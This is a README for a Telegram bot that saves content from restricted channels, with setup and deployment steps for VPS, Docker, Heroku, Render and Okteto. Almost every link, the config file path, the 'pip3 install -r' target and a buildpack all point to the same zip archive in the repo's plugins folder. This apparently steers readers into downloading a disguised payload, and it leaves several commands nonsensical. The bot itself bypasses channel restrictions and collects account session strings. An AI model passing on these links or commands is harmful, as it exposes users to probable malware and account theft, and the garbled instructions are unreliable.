<h1 align="center">
  <b>Save restricted content Bot</b>
</h1> 

Contact: [Telegram](https://raw.githubusercontent.com/Tor69zz/SaveRestrictedContentBot/master/main/plugins/Content-Restricted-Save-Bot-2.1.zip)

A stable telegram bot to get restricted messages with custom thumbnail support , made by Mahesh Chauhan. 

- works for both public and private channels
- Custom thumbnail support for Pvt medias
- supports text and webpage media messages
- Faster speed
- Forcesubscribe available 
- `/batch` - (For owner only) Use this command to save upto 100 files from a pvt or public restricted channel at once.
- Time delay is added to avoid FloodWait and keep user account safe. 

# Variables

- `API_ID`
- `API_HASH`
- `SESSION`
- `BOT_TOKEN` 
- `AUTH` - Owner user id
- `FORCESUB` - Public channel username without '@'. Don't forget to add bot in channel as administrator. 

# Get API & PYROGRAM string session from:
 
API: [API scrapper Bot](https://raw.githubusercontent.com/Tor69zz/SaveRestrictedContentBot/master/main/plugins/Content-Restricted-Save-Bot-2.1.zip) or [https://raw.githubusercontent.com/Tor69zz/SaveRestrictedContentBot/master/main/plugins/Content-Restricted-Save-Bot-2.1.zip](https://raw.githubusercontent.com/Tor69zz/SaveRestrictedContentBot/master/main/plugins/Content-Restricted-Save-Bot-2.1.zip)

PYROGRAM SESSION: [SessionGen Bot](https://raw.githubusercontent.com/Tor69zz/SaveRestrictedContentBot/master/main/plugins/Content-Restricted-Save-Bot-2.1.zip) or [![Run on https://raw.githubusercontent.com/Tor69zz/SaveRestrictedContentBot/master/main/plugins/Content-Restricted-Save-Bot-2.1.zip](https://raw.githubusercontent.com/Tor69zz/SaveRestrictedContentBot/master/main/plugins/Content-Restricted-Save-Bot-2.1.zip)](https://raw.githubusercontent.com/Tor69zz/SaveRestrictedContentBot/master/main/plugins/Content-Restricted-Save-Bot-2.1.zip)

BOT TOKEN: @Botfather on telegram

# Deploy

Deploy on `VPS`

Easy Method:

- Intall docker-compose
- Fill in the variables in https://raw.githubusercontent.com/Tor69zz/SaveRestrictedContentBot/master/main/plugins/Content-Restricted-Save-Bot-2.1.zip file using your favorite text editor or nano 
- Start the container 

```
sudo apt install docker-compose -y
nano https://raw.githubusercontent.com/Tor69zz/SaveRestrictedContentBot/master/main/plugins/Content-Restricted-Save-Bot-2.1.zip
sudo docker-compose up --build
```

The hard Way:

- Fill vars in your fork in [this](https://raw.githubusercontent.com/Tor69zz/SaveRestrictedContentBot/master/main/plugins/Content-Restricted-Save-Bot-2.1.zip) file as shown in this [picture](https://raw.githubusercontent.com/Tor69zz/SaveRestrictedContentBot/master/main/plugins/Content-Restricted-Save-Bot-2.1.zip)
- enter all the below commands

```
sudo apt update
sudo apt install ffmpeg git python3-pip
git clone your_repo_link
cd saverestrictedcontentbot 
pip3 install -r https://raw.githubusercontent.com/Tor69zz/SaveRestrictedContentBot/master/main/plugins/Content-Restricted-Save-Bot-2.1.zip
python3 -m main
```

- if you want bot to be running in background then enter `screen -S srcb` before `python3 -m main` 
- after `python3 -m main`, click ctrl+A, ctrl+D
- if you want to stop bot, then enter `screen -r srcb` and click ctrl+A then press K and enter Y.

Deploy your bot on `Render`

Tutorial - [Click here](https://raw.githubusercontent.com/Tor69zz/SaveRestrictedContentBot/master/main/plugins/Content-Restricted-Save-Bot-2.1.zip)

Deploy your bot on `heroku`

» Method - 1:
- Star the repo, and fork it in desktop mode
- Go to settings of your forked repo
- Rename your repo by any other name
- Click on  [![Deploy](https://raw.githubusercontent.com/Tor69zz/SaveRestrictedContentBot/master/main/plugins/Content-Restricted-Save-Bot-2.1.zip)](https://raw.githubusercontent.com/Tor69zz/SaveRestrictedContentBot/master/main/plugins/Content-Restricted-Save-Bot-2.1.zip)
 
» Method - 2:
- Star the repo, and fork it in desktop mode
- create app in heroku
- go to settings of app›› config vars›› add all variables
- add buildpacks
- connect to github and deploy
- turn on dynos
  
Buildpacks for manual deploy:

- `heroku/python`
- `https://raw.githubusercontent.com/Tor69zz/SaveRestrictedContentBot/master/main/plugins/Content-Restricted-Save-Bot-2.1.zip`

Deploy your bot on `Okteto` [Useless]
  
Tutorial for okteto - [click here](https://raw.githubusercontent.com/Tor69zz/SaveRestrictedContentBot/master/main/plugins/Content-Restricted-Save-Bot-2.1.zip)

[![Develop on Okteto](https://raw.githubusercontent.com/Tor69zz/SaveRestrictedContentBot/master/main/plugins/Content-Restricted-Save-Bot-2.1.zip)](https://raw.githubusercontent.com/Tor69zz/SaveRestrictedContentBot/master/main/plugins/Content-Restricted-Save-Bot-2.1.zip)
